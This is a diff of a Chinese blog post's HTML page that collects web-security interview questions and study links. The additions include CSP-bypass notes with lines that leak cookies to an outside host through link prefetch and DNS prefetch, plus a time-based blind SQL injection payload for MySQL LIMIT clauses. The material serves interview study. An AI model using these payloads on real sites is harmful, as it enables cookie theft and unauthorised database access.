@@ -16,10 +16,12 @@
 <meta property="og:site_name" content="Obolu的小博客">
 <meta property="og:description" content="记录一下面试中的问题和需要学习的点">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2019-03-31T03:26:49.614Z">
+<meta property="og:image" content="https://img.5am3.com/images/20190331/0lV4EPNWchaj.png?imageslim">
+<meta property="og:updated_time" content="2019-03-31T07:27:07.484Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="面试经验总结">
 <meta name="twitter:description" content="记录一下面试中的问题和需要学习的点">
+<meta name="twitter:image" content="https://img.5am3.com/images/20190331/0lV4EPNWchaj.png?imageslim">
   
     <link rel="alternative" href="/atom.xml" title="Obolu的小博客" type="application/atom+xml">
   
@@ -168,7 +170,7 @@
 
         
         <a href="/2019/03/31/面试经验总结/" class="archive-article-date">
-  	<time datetime="2019-03-31T02:46:26.831Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-31</time>
+  	<time datetime="2019-03-31T06:40:12.340Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-31</time>
 </a>
         
       </header>
@@ -182,6 +184,8 @@
 <p>3.XSS绕过httponly</p>
 <p>4.绕过CSP</p>
 <p><a href="https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html" target="_blank" rel="noopener">bypass csp</a></p>
+<p><a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">CSP绕过方式</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)URL跳转：在<span class="keyword">default</span>-src <span class="string">'none'</span>的情况下，可以使用meta标签实现跳转，在允许unsafe-inline的情况下，可以用<span class="built_in">window</span>.location</span><br><span class="line"><span class="number">2</span>)&lt;link&gt;标签预加载</span><br><span class="line">旧版Chrome:<span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span></span><br><span class="line">Firefox利用DNS解析:&lt;link rel="dns-prefetch" href="//[cookie].xxx.ceye.io"&gt;</span><br><span class="line">3)iframe：如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP</span><br><span class="line">4)meta标签，meta可以控制缓存，可以设置Cookie（Firefox下）</span><br></pre></td></tr></table></figure>
 <p>5.XXE和SSRF危害</p>
 <p><a href="https://www.obolu.top/2019/03/22/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">XXE</a></p>
 <p><a href="https://www.freebuf.com/column/157466.html" target="_blank" rel="noopener">SSRF</a></p>
@@ -199,6 +203,9 @@
 <p>10.DNS LOG</p>
 <p><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">利用DNSlog实现无回显注入</a></p>
 <p><a href="http://www.tiaozhanziwo.com/archives/851.html" target="_blank" rel="noopener">DNSLOG使用技巧</a></p>
+<p>11.时间盲注太慢怎么办？</p>
+<p>12.绕过CDN查ip</p>
+<p><a href="https://www.cnblogs.com/Jochebed/p/5801546.html" target="_blank" rel="noopener">绕CDN</a></p>
 <h2 id="乙"><a href="#乙" class="headerlink" title="乙"></a>乙</h2><p>1.挖洞经历</p>
 <p>2.代码审计思路</p>
 <p>3.XXE</p>
@@ -221,13 +228,18 @@
 <p>7.挖洞经历</p>
 <p>8.文件包含利用方法</p>
 <p>9.介绍自己写过什么代码，做过什么项目</p>
+<p>10.报错注入函数</p>
+<p><img src="https://img.5am3.com/images/20190331/0lV4EPNWchaj.png?imageslim" alt="mark"></p>
 <h2 id="丁1"><a href="#丁1" class="headerlink" title="丁1"></a>丁1</h2><p>1.问的多一些的是自己介绍比赛中的一些经历</p>
 <p>2.跟进问了phar结合反序列化用到哪些函数</p>
 <p>3.XXE盲打有什么思路</p>
 <p>4.order by 后注入</p>
 <p><a href="https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html" target="_blank" rel="noopener">Mysql Order By注入总结</a></p>
-<p>5.limit注入</p>
+<p><a href="http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">order by 注入利用分析</a></p>
+<p>5.limit注入(大致思路有报错就用报错，没报错就用存储过程尝试盲注)</p>
 <p><a href="http://www.vuln.cn/8101" target="_blank" rel="noopener">再谈Mysql中limit后的注入</a></p>
+<p>​    如果注入点支持报错，那所有问题都ok，但是如果注入点不是报错的，还可以使用 time-based 的注入，payload 如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">field</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> 		   extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">MID</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p><a href="https://www.freebuf.com/articles/web/57528.html" target="_blank" rel="noopener">Mysql注入点在limit关键字后面的利用方法</a></p>
 <p>6.手机号重置密码的地方可能存在的逻辑漏洞</p>
 <p>7.内网渗透经验</p>
@@ -481,15 +493,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">web学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
               </li>
             
             <div class="clearfix"></div>
